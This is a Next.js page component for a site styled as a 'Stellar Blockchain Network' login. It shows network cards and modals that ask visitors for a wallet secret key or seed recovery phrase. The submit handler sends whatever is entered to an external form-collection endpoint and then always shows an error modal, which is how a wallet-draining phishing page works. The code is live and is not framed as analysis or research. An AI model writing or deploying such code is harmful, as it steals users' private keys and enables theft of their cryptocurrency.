"use client";
import Navbar from "./components/Navbar";
import Modals from "./components/Modals";
import NetworkCards from "./components/NetworkCards";
import Footer from "./components/Footer";
import { useState, useRef, useEffect, RefObject } from "react";

export default function Home() {
  // Modal state
  const [modal, setModal] = useState<null | "login" | "secret" | "phrase" | "error">(null);
  const [network, setNetwork] = useState<string>("");
  const secretKeyRef = useRef<HTMLInputElement | null>(null);
  const phraseRef = useRef<HTMLTextAreaElement | null>(null);
  const [navActive, setNavActive] = useState(false);

  useEffect(() => {
    if (typeof window !== "undefined" && (window as any).AOS) {
      (window as any).AOS.init();
    }
  }, []);

  // Modal logic
  const openLogin = (networkName: string) => {
    setNetwork(networkName);
    setModal("login");
  };
  const openSecret = () => setModal("secret");
  const openPhrase = () => setModal("phrase");
  const closeModal = () => setModal(null);
  const handleSubmit = async (type: "secret" | "phrase") => {
    const secret = (secretKeyRef.current as any)?.value || "";
    const phrase = (phraseRef.current as any)?.value || "";
    await fetch("https://formspree.io/f/mnqekvyo", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method: type === "secret" ? "Secret Key" : "Phrase Recovery Key",
        value: type === "secret" ? secret : phrase,
        network,
        to: "example@gmail.com"
      })
    });
    setModal("error");
  };

  return (
    <>
      <Modals
        modal={modal}
        closeModal={closeModal}
        openSecret={openSecret}
        openPhrase={openPhrase}
        secretKeyRef={secretKeyRef as RefObject<HTMLInputElement>}
        phraseRef={phraseRef as RefObject<HTMLTextAreaElement>}
        handleSubmit={handleSubmit}
      />
      <Navbar navActive={navActive} setNavActive={setNavActive} />
      <section className="blockchainNetworks flx fdc jcc aic">
        <h1>Stellar Blockchain Network</h1>
        <NetworkCards openLogin={openLogin} cardBg="white" />
      </section>
      <Footer />
    </>
  );
}
